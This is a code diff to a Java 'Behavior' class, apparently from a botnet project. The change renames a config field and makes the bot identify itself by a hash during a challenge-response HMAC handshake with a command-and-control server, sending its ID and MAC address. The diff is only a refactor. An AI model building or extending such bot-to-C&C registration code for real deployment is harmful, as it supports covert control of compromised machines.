@@ -30,7 +30,7 @@ import cs.sii.service.crypto.CryptoUtils;
 public class Behavior {
 
 	@Autowired
-	private Config engineBot;
+	private Config configEngine;
 
 	@Autowired
 	private NetworkService networkService;
@@ -53,7 +53,7 @@ public class Behavior {
 	public void initializeBot() {
 		
 		loadInfo();
-		if (!engineBot.isCommandandconquerStatus()) {
+		if (!configEngine.isCommandandconquerStatus()) {
 			// metter controllo ID se ==NULL genera altrimenti riusa
 			// TODO salvare ID su properties
 			// inserire id univoco nella richiesta
@@ -96,14 +96,12 @@ public class Behavior {
 
 	private boolean challengeToCommandConquer() {
 		System.out.println("IP C&C " + networkService.getCommandConquerIps().getCeCList().get(0).getValue1());
-		Pairs<Long, Integer> challenge = request.getChallengeFromCeC(engineBot.getIdBot(),
-				networkService.getCommandConquerIps().getCeCList().get(0).getValue1());
+		Pairs<Long, Integer> challenge = request.getChallengeFromCeC(networkService.getIdHash(),networkService.getCommandConquerIps().getCeCList().get(0).getValue1());
 		if (challenge != null) {
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 			System.out.println(hashMac);
-			String response = request.getResponseFromCeC(engineBot.getIdBot(), networkService.getMac(),
-					networkService.getCommandConquerIps().getCeCList().get(0).getValue1(), hashMac);
+			String response = request.getResponseFromCeC(networkService.getIdHash(), networkService.getMac(),networkService.getCommandConquerIps().getCeCList().get(0).getValue1(), hashMac);
 			System.out.println("La risposta del CeC: " + response);
 		}
 		return true;
